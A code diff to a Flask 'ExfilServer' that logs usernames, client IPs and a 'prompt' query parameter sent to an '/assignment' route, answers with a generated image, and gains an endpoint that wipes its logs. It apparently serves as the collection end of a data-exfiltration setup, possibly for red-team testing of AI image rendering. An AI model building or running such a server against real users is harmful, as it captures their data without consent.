@@ -139,7 +139,7 @@ class ExfilServer:
             return {"status": "image generation failed"}, 500
         
         @self.app.route('/assignment/', methods=['GET'])
-        @self.app.route('/m/', methods=['GET'])
+        @self.app.route('/assignment', methods=['GET'])
         def exfiltrate_assign():
             try:
                 token = request.args.get('token', '')
@@ -149,8 +149,7 @@ class ExfilServer:
                 payload = self.verify_hs256_and_get_payload(token, SECRET)
                 username = payload.get('username') if payload else 'UNKNOWN'
 
-                decoded_prompt = self.b64_url_decode(prompt) if hasattr(self, 'b64_url_decode') else prompt
-                data = f"Username: {username} -> {decoded_prompt}"
+                data = f"Username: {username} -> {prompt}"
 
                 with open(self.log_path, 'a') as log_file:
                     client_ip = request.remote_addr or "-"
@@ -161,7 +160,7 @@ class ExfilServer:
                     img_io = io.BytesIO()
                     image.save(img_io, 'PNG')
                     img_io.seek(0)
-                    return send_file(img_io, mimetype='image/png')
+                    return send_file(img_io, mimetype='image/png'), 200
                 return {"status": "image generation failed"}, 500
             except Exception as e:
                 return {"status": "error", "message": str(e)}, 500
@@ -205,6 +204,24 @@ class ExfilServer:
 
             lines = [ln.rstrip('\n') for ln in lines][::-1]
             return jsonify({"count": len(lines), "lines": lines})
+        
+        @self.app.route('/delete-logs/', methods=['POST', 'DELETE'])
+        def delete_logs():
+            try:
+                # Count existing lines (for reporting)
+                try:
+                    with open(self.log_path, 'r', encoding='utf-8', errors='replace') as f:
+                        prev_count = sum(1 for _ in f)
+                except FileNotFoundError:
+                    prev_count = 0
+
+                # Truncate (creates the file if it doesn't exist)
+                with open(self.log_path, 'w', encoding='utf-8'):
+                    pass
+
+                return jsonify({"status": "ok", "deleted": prev_count}), 200
+            except Exception as e:
+                return jsonify({"status": "error", "error": str(e)}), 500
         
         @self.app.route('/auth/<token>', methods=['GET'])
         @self.app.route('/auth/<token>/', methods=['GET'])
